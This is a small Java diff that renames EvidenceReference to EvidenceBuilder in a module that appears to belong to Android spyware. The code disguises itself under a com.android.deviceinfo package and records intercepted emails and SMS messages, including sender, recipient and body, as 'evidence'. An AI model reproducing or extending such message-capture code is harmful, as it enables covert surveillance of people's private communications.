@@ -27,7 +27,7 @@ import com.android.deviceinfo.conf.ChildConf;
 import com.android.deviceinfo.conf.ConfModule;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.db.GenericSqliteHelper;
-import com.android.deviceinfo.evidence.EvidenceReference;
+import com.android.deviceinfo.evidence.EvidenceBuilder;
 import com.android.deviceinfo.evidence.EvidenceType;
 import com.android.deviceinfo.evidence.Markup;
 import com.android.deviceinfo.file.AutoFile;
@@ -582,7 +582,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		Check.asserts(additionalData.length == 24, "Mail Wrong buffer size: " + additionalData.length); //$NON-NLS-1$
 
 		try {
-			EvidenceReference.atomic(EvidenceType.MAIL_RAW, additionalData, mail.getBytes("UTF-8"));
+			EvidenceBuilder.atomic(EvidenceType.MAIL_RAW, additionalData, mail.getBytes("UTF-8"));
 		} catch (UnsupportedEncodingException e) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveEmail) Error: " + e);
@@ -618,7 +618,7 @@ public class ModuleMessage extends BaseModule implements Observer<Sms> {
 		databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
 		databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
 
-		EvidenceReference.atomic(EvidenceType.SMS_NEW, additionalData, body);
+		EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body);
 
 		return isStopRequested();
 	}
